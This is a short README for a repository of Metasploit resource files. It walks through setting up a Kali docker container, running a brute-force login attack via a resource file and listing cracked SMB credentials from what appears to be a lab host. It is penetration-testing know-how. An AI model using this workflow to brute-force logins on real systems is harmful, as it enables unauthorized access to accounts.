# Metasploit-resource-files

## Prepare a password list and a dictionary list
- [pass.list](https://github.com/DharmaDoll/Metasploit-resource-files/blob/main/pass.list)
- [uer.list](https://github.com/DharmaDoll/Metasploit-resource-files/blob/main/user.list)

## Setup docker container 
```sh
$ ./setup.sh
```

## Preparing metasploit resource file(.rc)
- [Brute force login to system using http basic authentication sample (http_basic.rc)](https://github.com/DharmaDoll/Metasploit-resource-files/blob/main/http_basic.rc)

## Run the exploit
```sh
$ ./exploit.sh kali_rolling http_basic.rc 2020_test_workspace
```

## Check result
```sh
$ docker exec -it kali_rolling msfconsole

msf6 > workspace
  2020_test_workspace
* default

msf6 > workspace 2020_test_workspace
msf6 > creds
==========
host           origin        service        public         private               realm  private_type  JtR Format
----           ------        -------        ------         -------               -----  ------------  ----------
172.21.121.2   172.21.121.2  445/tcp (smb)  mike           P@ssw0rd                     Password
172.21.121.2   172.21.121.2  445/tcp (smb)  michel         root                         Password
172.21.121.2   172.21.121.2  445/tcp (smb)  Administrator  admin                        Password
```
